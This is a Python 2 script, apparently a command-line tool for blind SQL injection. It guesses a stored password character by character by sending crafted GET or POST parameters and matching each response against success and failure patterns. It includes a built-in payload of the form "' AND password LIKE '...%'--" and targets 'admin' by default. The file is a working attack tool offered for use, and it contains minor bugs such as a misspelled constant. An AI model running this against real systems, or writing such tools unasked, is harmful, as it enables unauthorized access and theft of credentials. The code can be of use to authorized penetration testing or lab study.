#!/usr/bin/env python2
from argparse import ArgumentParser, ArgumentTypeError
from ast import literal_eval
import re, sys, requests, string
from furl import furl

PARAM_DICT = 0
POST_DICT = 1

class Inject(object):
    def __init__(self, url, post, params):
        self.post = post 
        self.params = params 
        self.key = None
        self.key_dict = None
        self.url = url 
        self.success = None
        self.fail = None
        self.input = None
        self.variables = None
        self.max_length = 128 

def usage():
    parser.print_help()
    sys.exit(1)

def url(u):
    r = requests.head(u)
    return u

def regex(s):
    try:
        re.compile(s)
    except Exception as e:
        msg = "Invalid regex '{0}'\n\t{1}".format(s, e.message)
        raise ArgumentTypeError(msg)
    return s


def dict_string(s):
    try:
        d=literal_eval(s)
    except Exception as e:
        msg = "Parameter {0} must be of type dict\n\t{1}".format(s, e.message)
        raise ArgumentTypeError(msg)
    if type(d) != dict:
        msg = "Parameter {} must be of type dict".format(s)
        raise ArgumentTypeError(msg)
    return d

def inject_enum(s):
    if s.lower() == "param":
        return PARM_DICT
    elif s.lower() == "post":
        return POST_DICT
    msg = "value must either be 'param' or 'post'"
    raise ArgumentTypeError(msg)


def sql_retrieve(inject):
    
    password = inject.prefix
    i = 0

    while i < len(inject.input) and len(password) < inject.max_length:

        c = inject.input[i]
        i += 1

        # copy is very important
        credentials = inject.key_dict.copy()
        format_vars = inject.key_dict.copy()

        format_vars['found'] = password
        format_vars['char'] = c

        format_vars.update(inject.variables)
    
        text = "" 

        credentials[inject.key] = credentials[inject.key].format(**format_vars)

        if inject.post:
            f = furl(inject.url)
            f.args = inject.params
            res = requests.post(f.url, data=credentials)
            text = res.text
        else:
            res = requests.get(inject.url, params=credentials)
            text = res.text

        if not inject.fail.search(text) and inject.success.search(text):
            password += c
            i = 0

    return password


if __name__ == "__main__":

    symbols = re.sub("%|_|\[|\]|'","",string.punctuation)

    parser = ArgumentParser()
    parser.add_argument("url", type=url)
    parser.add_argument("--failed-regex", type=regex,
        default="invalid|incorrect|fail|bad")
    parser.add_argument("--success-regex", type=regex, 
        default=".*")
    parser.add_argument("-c", "--no-ignore-case", default=False)

    parser.add_argument("--printable", action="append_const", 
        const=string.printable, dest="input", 
        help="Try all printable characters")
    parser.add_argument("--alphabet", action="append_const", 
        const=string.letters, dest="input", 
        help="Try all alphabetic characters")
    parser.add_argument("--alpha_lower", action="append_const", 
        const=string.lowercase, dest="input", 
        help="Try all lowercase alphabetic characters")
    parser.add_argument("--alpha_upper", action="append_const", 
        const=string.uppercase, dest="input", 
        help="Try all uppercase alphabetic characters")
    parser.add_argument("--digits", action="append_const", 
        const=string.digits, dest="input", 
        help="Try all digit characters")
    parser.add_argument("--symbol", action="append_const", 
        const=symbols, dest="input", 
        help="Try all punctuation characters")
    parser.add_argument("--whitespace", action="append_const", 
        const=string.whitespace, dest="input", 
        help="Try all whitespace characters")
    parser.add_argument("--custom-chars", action="append", dest="input", 
        help="Try given custom characters")

    parser.add_argument("--prefix", default="", help="prefix to use for injection")
    parser.add_argument("--var-dict", default="{'user_var': 'admin'}", type=dict_string,
        help="dictionary of additional variables that can be formatted into post vars and param vars")
    parser.add_argument("-l", "--standard-like-query", action="store_const", default=False, 
        const="{user_var}' AND password LIKE '{found}{char}%'--", help="prefix to use for injection")
    parser.add_argument("-p", "--post", default=None, type=dict_string)
    parser.add_argument("-u", "--url-params", type=dict_string)
    parser.add_argument("-i", "--inject", required=True, help="key of parameter to iterate with, \
        use the python2 interpolation string '{}' in the injection string")
    parser.add_argument("--inject-type", help="set to 'param' to use parameter dictionary,\
        set to 'post' for the post dictionary. leave blank to automatically set", type=inject_enum)

    args = parser.parse_args()
    injector = Inject(args.url, args.post, args.url_params)

    if args.no_ignore_case:
        injector.success = re.compile(args.success_regex)
        injector.fail = re.compile(args.failed_regex)
    else:
        injector.success = re.compile(args.success_regex, flags=re.IGNORECASE)
        injector.fail = re.compile(args.failed_regex, flags=re.IGNORECASE)

    injector.key = args.inject
    injector.prefix = args.prefix

    injector.variables = args.var_dict
    
    if not args.input:
        args.input = string.letters + string.digits + symbols

    injector.input = "".join(set("".join(args.input)))

    if not args.post and not args.url_params:
        print "must have either post parameters or url parameters"
        usage()

    if not args.inject_type:
        if args.url_params and args.inject in args.url_params:
            injector.key_dict = args.url_params
        if args.post and args.inject in args.post:
            injector.key_dict = args.post 
    elif args.inject_type == PARAM_DICT:
        injector.key_dict = injector.params
    elif args.inject_type == POST_DICT:
        injector.key_dict = injector.post
    
    if injector.key_dict:
        if args.inject not in injector.key_dict:
            print "invalid injection key"
            usage()
    else:
        print "invalid injection key or injection type"
        usage()

    if args.standard_like_query:
        injector.key_dict[injector.key] = args.standard_like_query

    print sql_retrieve(injector)
